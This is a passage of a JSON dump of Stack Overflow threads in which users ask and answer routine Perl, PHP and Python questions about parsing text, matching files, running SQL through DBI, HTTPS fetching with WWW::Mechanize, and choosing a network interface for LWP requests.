"https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 1, "creation_date": 1446795946, "post_id": 33561678, "comment_id": 54901914, "body": "Hi Arpita, please show us your effort to solve your problem? Also your question is not very clear <code>cut the unique data into different arrays</code> here. Please show us your expected output also."}], "answers": [{"tags": [], "owner": {"reputation": 1073, "user_id": 1039320, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/28ba137ea03056ffb3a2e6db49ac29cd?s=128&d=identicon&r=PG", "display_name": "jreisinger", "link": "https://stackoverflow.com/users/1039320/jreisinger"}, "is_accepted": false, "score": -2, "last_activity_date": 1446801307, "creation_date": 1446801307, "answer_id": 33563204, "question_id": 33561678, "link": "https://stackoverflow.com/questions/33561678/i-have-a-multi-lined-output-and-i-need-to-split-and-push-the-data-into-arrays/33563204#33563204", "title": "I have a multi lined output and I need to split and push the data into arrays", "body": "<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nmy ( @names, @classes, @buses, @cities );\n\nwhile (&lt;DATA&gt;) {    # loop over lines; line is stored in $_\n    my ( $name, $class, $bus, $city ) =\n      /Thestudentname=(\\w+)&amp;class=(\\d+)&amp;availbus=(\\w+)&amp;city=(\\w+)/;\n    push @names,   $name;\n    push @classes, $class;\n    push @buses,   $bus;\n    push @cities,  $city;\n}\n\n# Print out the arrays' content\nuse Data::Dumper;\nprint Dumper \\( @names, @classes, @buses, @cities );\n\n__DATA__\nThestudentname=ravi&amp;class=2&amp;availbus=yes&amp;city=hyd\nThestudentname=shyam&amp;class=4&amp;availbus=no&amp;city=cal\nThestudentname=rohan&amp;class=6&amp;availbus=yes&amp;city=mum\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 5532216, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xhH05FDOT10/AAAAAAAAAAI/AAAAAAAAEl0/rfCX3ceXZno/photo.jpg?sz=128", "display_name": "Sai Arpita", "link": "https://stackoverflow.com/users/5532216/sai-arpita"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 47, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1446801307, "creation_date": 1446795367, "last_edit_date": 1446797217, "question_id": 33561678, "link": "https://stackoverflow.com/questions/33561678/i-have-a-multi-lined-output-and-i-need-to-split-and-push-the-data-into-arrays", "title": "I have a multi lined output and I need to split and push the data into arrays", "body": "<p>I have an output which has similar lines with unique data. I have to cut the unique data into different arrays and use it in a forloop. Also, my output would not have a fixed number of lines and depends on time of execution when kept in cron job.</p>\n\n<p>For example: </p>\n\n<pre><code>Thestudentname=ravi&amp;class=2&amp;availbus=yes&amp;city=hyd\nThestudentname=shyam&amp;class=4&amp;availbus=no&amp;city=cal\nThestudentname=rohan&amp;class=6&amp;availbus=yes&amp;city=mum\n.\n.\n.\n</code></pre>\n\n<p>Here names, class, bus and city should be my arrays and all of them have same number of array elements for a given execution.</p>\n"}, {"tags": ["php", "perl"], "comments": [{"owner": {"reputation": 3089, "user_id": 930306, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/6e806343113c5ce45aa912889cd9be3b?s=128&d=identicon&r=PG", "display_name": "jycr753", "link": "https://stackoverflow.com/users/930306/jycr753"}, "edited": false, "score": 2, "creation_date": 1446792988, "post_id": 33561126, "comment_id": 54900677, "body": "have you tried anything?"}, {"owner": {"reputation": 21, "user_id": 3869115, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/b403c47be2f49ac30bf24c116929a3f2?s=128&d=identicon&r=PG&f=1", "display_name": "user3869115", "link": "https://stackoverflow.com/users/3869115/user3869115"}, "reply_to_user": {"reputation": 3089, "user_id": 930306, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/6e806343113c5ce45aa912889cd9be3b?s=128&d=identicon&r=PG", "display_name": "jycr753", "link": "https://stackoverflow.com/users/930306/jycr753"}, "edited": false, "score": 0, "creation_date": 1446793203, "post_id": 33561126, "comment_id": 54900778, "body": "have tried reguler open with perl like : open(FILES, $tar) or print(&quot;Cannot Locate : $tar\\n&quot;);  my @lists=&lt;FILES&gt;;  close(FILES);  foreach $list(@lists){  $list=~s/^\\s+//;  $list=~s/\\s+$//;  { if($list=~/(.*):(.*)/g){      my $name1 = $1;      my $name2= $2; ... but have no clue how to open the second file..read it 1 by 1 till got the match...it keep read 1 result from file 1..sorry i&#39;m new with program stuff"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446794330, "post_id": 33561126, "comment_id": 54901254, "body": "You should probably edit your question to include that code so that it looks like you made an effort to solve this problem yourself. Also, hashes."}, {"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 0, "creation_date": 1446795707, "post_id": 33561126, "comment_id": 54901806, "body": "What do you mean  by large size? Be specific?"}, {"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 0, "creation_date": 1446796866, "post_id": 33561126, "comment_id": 54902314, "body": "I meant size of files?"}, {"owner": {"reputation": 21, "user_id": 3869115, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/b403c47be2f49ac30bf24c116929a3f2?s=128&d=identicon&r=PG&f=1", "display_name": "user3869115", "link": "https://stackoverflow.com/users/3869115/user3869115"}, "edited": false, "score": 0, "creation_date": 1446797234, "post_id": 33561126, "comment_id": 54902494, "body": "there are only 2 files with large size"}], "answers": [{"tags": [], "owner": {"reputation": 26118, "user_id": 3603681, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bSAfF.jpg?s=128&g=1", "display_name": "Professor Abronsius", "link": "https://stackoverflow.com/users/3603681/professor-abronsius"}, "is_accepted": false, "score": 0, "last_activity_date": 1446799013, "last_edit_date": 1446799013, "creation_date": 1446798680, "answer_id": 33562480, "question_id": 33561126, "link": "https://stackoverflow.com/questions/33561126/find-match-result-with-php-or-perl/33562480#33562480", "title": "Find Match Result with PHP or PERL", "body": "<p>I have no idea how well the following will perform with large files - the test files were exactly as the example but this does return the desired result so long as I interpreted the pattern correctly. </p>\n\n<pre><code>        $names_1=__DIR__.'\\names1.txt';\n        $names_2=__DIR__.'\\names2.txt';\n        /* Read each source file into an array */\n        $lines_1=file( $names_1, FILE_TEXT | FILE_SKIP_EMPTY_LINES | FILE_IGNORE_NEW_LINES );\n        $lines_2=file( $names_2, FILE_TEXT | FILE_SKIP_EMPTY_LINES | FILE_IGNORE_NEW_LINES );\n\n        /* placeholders */\n        $arr_1=array();\n        $arr_2=array();\n        $arr_3=array();\n        $arr_4=array();\n\n        /* Populate $arr_1 using value as key */\n        foreach( $lines_1 as $index =&gt; $line ){\n            list( $w1,$w2 )=explode('-', str_replace( ' ', '', $line ) );\n            $arr_1[ $w2 ]=$w1;\n        }\n\n        /* populate arr_2 */\n        foreach( $lines_2 as $index =&gt; $line ){\n            list( $w1,$w2 )=explode('=', str_replace( ' ', '', $line ) );\n            $arr_2[ $w1 ]=$w2;\n        }\n\n        /* Find where there are common keys between the two arrays */\n        $arr_3=array_intersect_key( $arr_1, $arr_2 );\n\n        /* populate output array in format expected */\n        foreach( $arr_3 as $i =&gt; $v ){\n            $arr_4[]=$arr_1[ $i ]. ' - '. $i .' = '.$arr_2[ $i ];\n        }\n\n        /* show results */\n        echo '&lt;pre&gt;',print_r($arr_4,true),'&lt;/pre&gt;';\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 3869115, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/b403c47be2f49ac30bf24c116929a3f2?s=128&d=identicon&r=PG&f=1", "display_name": "user3869115", "link": "https://stackoverflow.com/users/3869115/user3869115"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 35, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1446799013, "creation_date": 1446792855, "last_edit_date": 1446793074, "question_id": 33561126, "link": "https://stackoverflow.com/questions/33561126/find-match-result-with-php-or-perl", "title": "Find Match Result with PHP or PERL", "body": "<p>I have 2 files (large size)</p>\n\n<ul>\n<li>name1.txt</li>\n<li>name2.txt</li>\n</ul>\n\n<p><strong>name1.txt :</strong></p>\n\n<pre><code>smooth - temper\nleft - corner\netc.\n</code></pre>\n\n<p><strong>name 2.txt :</strong></p>\n\n<pre><code>corner = hard\ntemper = small\netc.\n</code></pre>\n\n<p>How can I find match from <code>name1.txt</code> in <code>name2.txt</code>, than place it within <code>name3.txt</code></p>\n\n<p><strong>output name3.txt :</strong></p>\n\n<pre><code>smooth - temper = small\nleft - corner = hard\n</code></pre>\n"}, {"tags": ["perl", "dbi"], "answers": [{"tags": [], "owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "is_accepted": true, "score": 1, "last_activity_date": 1446787485, "creation_date": 1446787485, "answer_id": 33560066, "question_id": 33559713, "link": "https://stackoverflow.com/questions/33559713/does-perl-dbi-support-command-like-this-file-name/33560066#33560066", "title": "Does perl DBI support command like this @file_name?", "body": "<p>No, that won't work (obviously). Some DBI drivers support multiple statements (MySQL and SQL Server via ODBC come to mind), but I don't think Oracle does. At any rate, you'd still have to handle the file reading part yourself. As you can see in the <a href=\"https://metacpan.org/pod/DBI#do\" rel=\"nofollow\">DBI docs</a>, <code>do()</code> is expecting a valid SQL statement, which the string <code>@1.sql</code> is not.</p>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user1919238"}, "is_accepted": false, "score": 1, "last_activity_date": 1446792876, "creation_date": 1446792876, "answer_id": 33561135, "question_id": 33559713, "link": "https://stackoverflow.com/questions/33559713/does-perl-dbi-support-command-like-this-file-name/33561135#33561135", "title": "Does perl DBI support command like this @file_name?", "body": "<p>Your basic options for executing an SQL file from Perl are:</p>\n\n<p><strong>Split the SQL file yourself and then execute each statement.</strong> </p>\n\n<p>If you have control of the file and know it won't contain anything tricky, this is a fairly easy task.  It could be as easy as splitting the file based on a semicolon character, or you might want to add some basic stripping of comments first.</p>\n\n<p>However, this is quite hard to do 100% correctly for the full range of possible file content (what if an SQL statement has a string containing a semicolon?  What if there are nested sets of comments?  etc.).  This requires fully parsing the file--and I'm not aware of any tool that allows you to do this easily.  There is an <code>SQL::Parse</code> module, but I don't think it handles multiple statements.</p>\n\n<p><strong>Call an external program from Perl to do it for you.</strong></p>\n\n<p>For example, call the Oracle command line client.  This is easy, but you don't have granular control of the statements being executed.</p>\n"}], "owner": {"reputation": 169, "user_id": 3748944, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/4bcc4d704b14945b7e14aed5065b9981?s=128&d=identicon&r=PG&f=1", "display_name": "Oleksandr Kovtunenko", "link": "https://stackoverflow.com/users/3748944/oleksandr-kovtunenko"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 69, "favorite_count": 0, "accepted_answer_id": 33560066, "answer_count": 2, "score": 0, "last_activity_date": 1446792876, "creation_date": 1446785364, "last_edit_date": 1446789098, "question_id": 33559713, "link": "https://stackoverflow.com/questions/33559713/does-perl-dbi-support-command-like-this-file-name", "title": "Does perl DBI support command like this @file_name?", "body": "<p>I would like to run commands which is placed in 1.sql file  This is my code:</p>\n\n<pre><code>$sth=$dbh-&gt;do( q { @1.sql } );\n</code></pre>\n\n<p>But this code isn't working:</p>\n\n<p>There is output:</p>\n\n<pre><code>DBI::db=HASH(0xf18edc0) trace level set to 0x0/2 (DBI @ 0x0/0) in DBI 1.634-ithread (pid 10389)\n    -&gt; do in DBD::_::db for DBD::Oracle::db (DBI::db=HASH(0xf18ee50)~0xf18edc0 ' @1.sql ') thr#eebf010\n   dbd_st_execute (STMT TYPE 0) (out0, lob0)...\nStatement Execute Mode is 32 (COMMIT_ON_SUCCESS)\n    -&gt; DESTROY for DBD::Oracle::st (DBI::st=HASH(0xf18f190)~INNER) thr#eebf010\n       ERROR: 900 'ORA-00900: invalid SQL statement (DBD ERROR: error possibly near &lt;*&gt; indicator at char 1 in ' &lt;*&gt;@1.sql ')' (err#1)\n    &lt;- DESTROY= undef at run.pl line 12\n    !! ERROR: 900 'ORA-00900: invalid SQL statement (DBD ERROR: error possibly near &lt;*&gt; indicator at char 1 in ' &lt;*&gt;@1.sql ')' (err#0)\n    &lt;- do= undef at run.pl line 12\nDBD::Oracle::db do failed: ORA-00900: invalid SQL statement (DBD ERROR: error possibly near &lt;*&gt; indicator at char 1 in ' &lt;*&gt;@1.sql ') [for Statement \" @1.sql \"] at run.pl line 12.\nDBD::Oracle::db do failed: ORA-00900: invalid SQL statement (DBD ERROR: error possibly near &lt;*&gt; indicator at char 1 in ' &lt;*&gt;@1.sql ') [for Statement \" @1.sql \"] at run.pl line 12.\n!   -&gt; DESTROY for DBD::Oracle::db (DBI::db=HASH(0xf18edc0)~INNER) thr#eebf010\n       ERROR: 900 'ORA-00900: invalid SQL statement (DBD ERROR: error possibly near &lt;*&gt; indicator at char 1 in ' &lt;*&gt;@1.sql ')' (err#0)\n!   &lt;- DESTROY= undef during global destruction\n</code></pre>\n"}, {"tags": ["perl", "https", "mechanize", "www-mechanize"], "comments": [{"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 0, "creation_date": 1446785314, "post_id": 33559009, "comment_id": 54898386, "body": "I am unable to connect to <code>https:&#47;&#47;www.cpan.org</code> using <code>https</code> through browser but able to connect to <code>https:&#47;&#47;metacpan.org&#47;</code> this using your script. I guess CPAN doesn&#39;t support <code>https</code>."}], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 5262517, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85895043f8db969dca963bd6c8259bb3?s=128&d=identicon&r=PG&f=1", "display_name": "ColdSoda", "link": "https://stackoverflow.com/users/5262517/coldsoda"}, "edited": false, "score": 0, "creation_date": 1446843369, "post_id": 33560348, "comment_id": 54929060, "body": "Thanks.  I had tried multiple sites to test http v https and the presence of the http.pm question clouded my thinking."}], "tags": [], "owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": false, "score": 0, "last_activity_date": 1446789189, "creation_date": 1446789189, "answer_id": 33560348, "question_id": 33559009, "link": "https://stackoverflow.com/questions/33559009/perl-wwwmechanize-not-connecting-over-https/33560348#33560348", "title": "Perl WWW:Mechanize not connecting over https", "body": "<blockquote>\n  <p>my $url =\"https://www.cpan.org\";</p>\n</blockquote>\n\n<p>Rule #1 when having problems with a script reaching a site: check with the browser. Surprise: it fails in the browser with ERR_CONNECTION_REFUSED. Which tells you that the site is not available with the browser too, so why should it work with the script.</p>\n\n<blockquote>\n  <p>Why is it using http.pm and not https.pm which is present in that directory?</p>\n</blockquote>\n\n<p>Because https is just http inside an SSL tunnel https support in LWP makes heavy use of the http support. Thus you get the error message from http.pm.</p>\n"}], "owner": {"reputation": 23, "user_id": 5262517, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85895043f8db969dca963bd6c8259bb3?s=128&d=identicon&r=PG&f=1", "display_name": "ColdSoda", "link": "https://stackoverflow.com/users/5262517/coldsoda"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1007, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1446789189, "creation_date": 1446780859, "question_id": 33559009, "link": "https://stackoverflow.com/questions/33559009/perl-wwwmechanize-not-connecting-over-https", "title": "Perl WWW:Mechanize not connecting over https", "body": "<p>I am trying to connect to a https website with WWW:Mechanize.  When I run my script, I receive the error \"Network is unreachable...\" message shown below.</p>\n\n<p>Why is it using http.pm and not https.pm which is present in that directory?  Source and error below...</p>\n\n<pre><code>#!/usr/bin/env perl\nuse LWP::UserAgent;\nuse LWP::Protocol::https;\nuse WWW::Mechanize;\n\n$ENV{HTTPS_DEBUG} = 1;\nprint \"WWW::Mechanize: \", $WWW::Mechanize::VERSION, \"\\n\";\nprint \"LWP : \", $LWP::UserAgent::VERSION, \"\\n\";\nprint \"LWP::Protocol::https : \" , $LWP::Protocol::https::VERSION, \"\\n\";\n\nmy $mech = WWW::Mechanize-&gt;new();\nmy $ua = LWP::UserAgent-&gt;new;\n$ua-&gt;protocols_allowed(['https']);\n$mech-&gt;add_handler(\"request_send\", sub { shift-&gt;dump; return });\n$mech-&gt;add_handler(\"response_done\", sub { shift-&gt;dump; return });\n\nmy $url =\"https://www.cpan.org\";\n\n$mech-&gt;get( $url );\n\nmy @links = $mech-&gt;links();\nfor my $link ( @links ) {\n    printf \"%s, %s\\n\", $link-&gt;text, $link-&gt;url;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>WWW::Mechanize: 1.75\nLWP : 6.13\nLWP::Protocol::https : 6.06\nGET https://www.cpan.org\nAccept-Encoding: gzip\nUser-Agent: WWW-Mechanize/1.75\n\n(no content)\n500 Can't connect to www.cpan.org:443\nContent-Type: text/plain\nClient-Date: Fri, 06 Nov 2015 03:29:49 GMT\nClient-Warning: Internal response\n\nCan't connect to www.cpan.org:443\\n\nNetwork is unreachable at /home/coldsoda/localperl/lib/site_perl/5.22.0/LWP/Protocol/http.pm line 47.\\n\nError GETing https://www.cpan.org: Can't connect to www.cpan.org:443 at ./mechurl.pl line 24.\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 149, "user_id": 5470067, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5ece1b9d92664f27aad6660b248daab?s=128&d=identicon&r=PG&f=1", "display_name": "Mike.pm", "link": "https://stackoverflow.com/users/5470067/mike-pm"}, "edited": false, "score": 1, "creation_date": 1446793362, "post_id": 33558601, "comment_id": 54900838, "body": "It isn&#39;t a perl task because OS selects the interface to perform a connection. Try to add a host route, for Linux is: <code>sudo route add -host 120.28.53.178 gw &lt;GATEWAY&gt; dev wlan0</code> where is <code>&lt;GATEWAY&gt;</code> is IP address of the default gateway at wlan0 interface."}], "answers": [{"comments": [{"owner": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "edited": false, "score": 0, "creation_date": 1446803534, "post_id": 33563842, "comment_id": 54905937, "body": "IP assigned to your WLAN connection."}, {"owner": {"reputation": 11, "user_id": 5531820, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/db47cacca66ed9fbe2c8881549aa48e2?s=128&d=identicon&r=PG&f=1", "display_name": "G. Gle", "link": "https://stackoverflow.com/users/5531820/g-gle"}, "edited": false, "score": 0, "creation_date": 1446803560, "post_id": 33563842, "comment_id": 54905950, "body": "Gateway: 192.168.0.1 or IP Address: 192.168.0.100"}], "tags": [], "owner": {"reputation": 9, "user_id": 5532917, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FHK3AEb8nsU/AAAAAAAAAAI/AAAAAAAAE1w/1zHYcdIl8eQ/photo.jpg?sz=128", "display_name": "Anatoly Y.", "link": "https://stackoverflow.com/users/5532917/anatoly-y"}, "is_accepted": false, "score": 1, "last_activity_date": 1446803305, "creation_date": 1446803305, "answer_id": 33563842, "question_id": 33558601, "link": "https://stackoverflow.com/questions/33558601/how-can-i-use-one-internet-connection-in-perl/33563842#33563842", "title": "How can I use one internet connection in perl", "body": "<p>You can try this hack</p>\n\n<pre><code>@LWP::Protocol::http::EXTRA_SOCK_OPTS = (LocalAddr =&gt; $source_ip);\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 5531820, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/db47cacca66ed9fbe2c8881549aa48e2?s=128&d=identicon&r=PG&f=1", "display_name": "G. Gle", "link": "https://stackoverflow.com/users/5531820/g-gle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 63, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1446803305, "creation_date": 1446777789, "question_id": 33558601, "link": "https://stackoverflow.com/questions/33558601/how-can-i-use-one-internet-connection-in-perl", "title": "How can I use one internet connection in perl", "body": "<p>I have 2 internet connection wlan0 and eth0 and I want to run this script in wlan0 only.</p>\n\n<pre><code>#!/usr/bin/perl\nuse LWP::UserAgent;\nmy $ua = LWP::UserAgent-&gt;new( timeout =&gt; 1 );\n$ua-&gt;agent(\"007\");\nmy $req = HTTP::Request-&gt;new( GET =&gt; 'http://120.28.53.178/favicon.ico' ); # HTTP::Request in wlan0 connection\nmy $ok = 1;\nmy $res;\nfor ( 1 .. 10 ) {\n    $res = $ua-&gt;request($req);\n    if ( $res-&gt;is_success ) {\n        print \"+ Google is up\\n\";\n    }\n    else {\n        print \"- Google is down\\n\";\n        $ok = 0;\n        last;\n    }\n    sleep 1;\n}\nif ($ok) {\n    print \"Result: Google is OK!\\n\";\n}\nelse {\n    print \"Result: Google is not OK!\\n\";\n}\n</code></pre>\n\n<p>How can I code it to use wlan0 internet only. This is posible in perl script?</p>\n"}, {"tags": ["python", "bash", "perl", "file", "loops"], "comments": [{"owner": {"reputation": 70549, "user_id": 4785185, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ChR5h.jpg?s=128&g=1", "display_name": "Prune", "link": "https://stackoverflow.com/users/4785185/prune"}, "edited": false, "score": 2, "creation_date": 1446770182, "post_id": 33557428, "comment_id": 54894412, "body": "Welcome to StackOverflow.  Please read and follow the posting guidelines in the help documentation.  <a href=\"http://stackoverflow.com/help/mcve\">MCVE</a> applies here.  We cannot effectively help you until you post your code and accurately describe the problem."}, {"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 1, "creation_date": 1446770289, "post_id": 33557428, "comment_id": 54894440, "body": "What about the <code>2nn</code> and <code>4nn</code> files? What about <code>qd</code> and <code>qp</code>? All the example files here are <code>d8</code>? What about <code>p8</code> (that you didn&#39;t mention at all)? You need to provide a much clearer indication of what you are actually trying to do here. Are you just looking to iterate through the files in a particular order of certain filename fields?"}, {"owner": {"reputation": 9, "user_id": 4677675, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-k-G6DF1UlpA/AAAAAAAAAAI/AAAAAAAAFS8/jheFzG8dZqs/photo.jpg?sz=128", "display_name": "Diego Calzadilla Hern&#225;ndez", "link": "https://stackoverflow.com/users/4677675/diego-calzadilla-hern%c3%a1ndez"}, "reply_to_user": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1446770919, "post_id": 33557428, "comment_id": 54894605, "body": "@EtanReisner, yes I also need to use 2nn and 4nn, I just wrote the example using previous values,, and yes I need to iterate through the files in a particular order of certain filename fields, I can&#39;t figure out how to browse through the file names in order to loop over the whole set of fields."}, {"owner": {"reputation": 10312, "user_id": 1681480, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/0wsSK.jpg?s=128&g=1", "display_name": "beroe", "link": "https://stackoverflow.com/users/1681480/beroe"}, "edited": false, "score": 1, "creation_date": 1446774559, "post_id": 33557428, "comment_id": 54895604, "body": "Are you starting with a list of files and trying to extrat those pieces out of it, or starting with those different values and trying to generate all the file names?"}, {"owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "edited": false, "score": 0, "creation_date": 1446776522, "post_id": 33557428, "comment_id": 54896138, "body": "What about the other parts of the file names, like the <code>qd-</code> and <code>qq-</code> prefixes and the extension <code>.q</code>? How do they affect the order?"}, {"owner": {"reputation": 9, "user_id": 4677675, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-k-G6DF1UlpA/AAAAAAAAAAI/AAAAAAAAFS8/jheFzG8dZqs/photo.jpg?sz=128", "display_name": "Diego Calzadilla Hern&#225;ndez", "link": "https://stackoverflow.com/users/4677675/diego-calzadilla-hern%c3%a1ndez"}, "reply_to_user": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "edited": false, "score": 0, "creation_date": 1446785367, "post_id": 33557428, "comment_id": 54898407, "body": "@martineau I already have files with those names, my task is to  extract information from them, so I need to browse all of them in search of the information desired. It has specific order, lets say for nn=1, d=PZ, z=2, vary d, with values d=8, d=16, d=32, d=64, and extract the information needed, then increase z=4 to get nn=1, d=PZ, z=4, and vary d with values d=8, d=16, d=3, d=64.... and so on. From answers given I would think that Im going to generate file names, then search in folder for file name generated and finally extract the information from each file. Thanks for suggestions."}, {"owner": {"reputation": 9, "user_id": 4677675, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-k-G6DF1UlpA/AAAAAAAAAAI/AAAAAAAAFS8/jheFzG8dZqs/photo.jpg?sz=128", "display_name": "Diego Calzadilla Hern&#225;ndez", "link": "https://stackoverflow.com/users/4677675/diego-calzadilla-hern%c3%a1ndez"}, "edited": false, "score": 0, "creation_date": 1446785463, "post_id": 33557428, "comment_id": 54898435, "body": "@berce, I think is better to generate file names and then search for each name file generated in my directory, and finally extract information from each file."}, {"owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "edited": false, "score": 0, "creation_date": 1446786024, "post_id": 33557428, "comment_id": 54898609, "body": "@Diego: Although you could do it by generating every possible filename and searching for it in the folder, seems like it would be quicker to just sort the filenames that exist in the folder into the desired processing order."}], "answers": [{"tags": [], "owner": {"reputation": 1273, "user_id": 2954187, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/27e9edd22ce0533aa62e399b96df4796?s=128&d=identicon&r=PG&f=1", "display_name": "George", "link": "https://stackoverflow.com/users/2954187/george"}, "is_accepted": true, "score": 1, "last_activity_date": 1446773104, "creation_date": 1446773104, "answer_id": 33557928, "question_id": 33557428, "link": "https://stackoverflow.com/questions/33557428/python-how-to-iterate-through-set-of-files-based-on-file-names/33557928#33557928", "title": "Python: How to iterate through set of files based on file names?", "body": "<p>Looks like a good task for a generator. I just did it for d, z, and n, but it should be easy enough to generalize to all of your filename fields:</p>\n\n<pre><code>def filename_generator():\n    l1 = ['d8', 'd16', 'd32', 'd64']\n    l2 = ['z1', 'z2', 'z4', ,'z8', 'z16', 'z32']\n    l3 = ['1nn', '2nn', '4nn', '8nn']\n    for n in l3:\n        for z in l2:\n            for d in l1:\n                yield '%s-%s-%s.q' % (d, z, n)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "is_accepted": false, "score": 0, "last_activity_date": 1446783155, "creation_date": 1446783155, "answer_id": 33559372, "question_id": 33557428, "link": "https://stackoverflow.com/questions/33557428/python-how-to-iterate-through-set-of-files-based-on-file-names/33559372#33559372", "title": "Python: How to iterate through set of files based on file names?", "body": "<p>You could something like the following. It may not be <em>exactly</em> what you want, since you've left some important details out of your question, but I've attempted to write it in a way to make it easy for you to change as necessary depending on what you really want.</p>\n\n<p>In a nutshell, what it does is use the <code>re</code> module break each filename up into \"fields\" with the numeric value found in each. These values are assigned corresponding names it a temporary dictionary, which is then used to create a <code>namedtuple</code> of the values with the desired field precedence. Other parts of the filename are ignored.</p>\n\n<p>The initial filename list can be obtained from the file system using <code>os.listdir()</code> or <code>glob.glob()</code>.</p>\n\n<pre><code>from collections import namedtuple\nimport re\n\nfilenames = ['qd-p64-dZP-d64-z8-8nn.q', 'qd-p8-dPZ-d8-z1-1nn.q',\n             'qd-p8-dPZ-d8-z1-2nn.q', 'qd-p8-dPZ-d8-z1-4nn.q',\n             